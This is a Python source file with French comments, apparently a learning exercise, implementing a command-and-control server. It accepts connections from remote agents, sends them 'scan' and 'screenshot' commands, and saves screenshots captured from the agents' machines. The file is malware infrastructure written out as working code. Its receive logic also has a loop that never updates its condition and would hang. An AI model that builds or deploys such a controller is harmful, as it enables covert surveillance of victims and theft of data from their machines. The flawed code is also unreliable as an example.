"""
    Coté server / besoin de socket uniquement - regarder librairie socket y'a un mot clé
    4 fonctions dans server Socket, bind, listen, accept
"""

import socket
import threading

C2_ADDR = '0.0.0.0'  # Écoute sur toutes les interfaces réseau
C2_PORT = 28964      # Port d'écoute du serveur

def start_server():
    #Démarre le serveur et accepte les connexions entrantes
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Crée un socket serveur
    server_socket.bind((C2_ADDR, C2_PORT)) #Liaison du socket à l'adresse et au port
    server_socket.listen(1)  #Le serveur accepte une connexion
    print(f"Serveur en écoute sur {C2_ADDR}:{C2_PORT}")

    while True:
        client_socket, client_address = server_socket.accept()  #Accepte une connexion entrante
        print(f"Connexion réussi avec {client_address}")
        threading.Thread(target=handle_client, args=(client_socket,)).start() #Démarrer un thread pour gérer l'agent

def handle_client(client_socket): #Gère les interactions avec l'agent
    try:
        while True:
            command = input("\nCommande à envoyer à l'agent (scan/screenshot/exit) : ")
            client_socket.send(command.encode())  #Envoie la commande au client

            # Scanne l'agent 
            if command == "scan":
                result = client_socket.recv(4096).decode()  #Recevoir le résultat du scan
                print(f"Résultat du scan : {result}")
            
            # Fait un screenshot sur l'agent
            elif command == "screenshot":
                # Recevoir la taille du fichier
                file_size_data = client_socket.recv(1024).decode() #Reçoit la taille du fichier

                while not file_size_data.isdigit():  #Vérifie si la donnée est un nombre
                    print(f"Taille reçu  : {file_size_data}")

                file_size_data = client_socket.recv(1024).decode()  #Reçoit à nouveau si la première donnée n'était pas valide
                file_size = int(file_size_data) #Convertit la taille en entier
                print(f"Taille du fichier : {file_size} octets")


                file_path = "received_screenshot.png" #Définit le chemin où l'image sera sauvegardée
                with open(file_path, "wb") as file: #Ouvre le fichier en mode écriture binaire car c'est une image
                    bytes_received = 0
                    while bytes_received < file_size: #Tant que le fichier n'est pas entièrement reçu
                        chunk = client_socket.recv(1024) #Reçoit par blocs de 1024 octets
                        if not chunk:
                            print("Transmission interrompue de manière inattendue") #Repère déconnexion ou un problème d'envoi
                            break

                        file.write(chunk) #Écrit le bloc dans le fichier
                        bytes_received += len(chunk) #Met à jour le nombre d'octets reçus
                        print(f"Reçu : {bytes_received}/{file_size} octets")  #Affiche le nombre d'octets reçus
                
                print(f"Capture d'écran reçue et sauvegardée sous '{file_path}'")

            # Se déconnecter de l'agent
            elif command == "exit":
                print("Déconnexion de l'agent.")
                client_socket.close()
                break
            
            # Si une autre action est demandée
            else:
                print("Commande inconnue.")

    # Gestion des erreurs de connexion avec l'agent
    except ConnectionError:
        print("Connexion avec l'agent perdue.")
    except Exception as e:
        print(f"Erreur : {e}")
        client_socket.close()

if __name__ == "__main__":
    start_server()  # Lance le serveur



